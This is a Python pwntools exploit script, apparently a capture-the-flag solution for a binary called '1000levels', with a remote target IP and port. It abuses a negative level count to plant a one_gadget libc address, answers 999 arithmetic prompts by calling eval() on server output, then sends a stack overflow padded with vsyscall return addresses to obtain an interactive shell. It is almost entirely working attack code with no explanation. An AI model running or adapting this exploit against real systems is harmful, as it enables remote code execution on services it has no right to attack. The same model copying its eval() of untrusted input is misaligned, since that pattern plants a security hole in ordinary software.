#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import * 

DEBUG = 1

if DEBUG:
	p = process('./1000levels', env={'LD_PRELOAD':'./libc.so.6'})
	context.terminal = ['terminator', '-x', 'sh', '-c']
	context.log_level = "debug"
	# gdb.attach(p)
else:
	p = remote('47.74.147.103', 20001)
libc_base = -0x45390
one_gadget_base = 0x4526a

def ansewer():
	p.recvuntil('Question: ') 
	tmp1 = eval(p.recvuntil(' ')[:-1])
	p.recvuntil('* ')
	tmp2 = eval(p.recvuntil(' ')[:-1])
	p.sendline(str(tmp1 * tmp2))

def ansewer2():
	p.recvuntil("Answer:")
	p.sendline("233")

p.recvuntil('Choice:')
p.sendline('2')
p.recvuntil('Choice:')
p.sendline('1')
p.recvuntil('How many levels?')
p.sendline('-1')
p.recvuntil('Any more?')

# p.sendline("2")
p.sendline(str(libc_base+one_gadget_base))
for i in range(999): 
	log.info(i)
	ansewer()
p.recvuntil('Question: ')
# gdb.attach(p)

p.send('a'*0x38 + p64(0xffffffffff600000) * 3) 
p.interactive()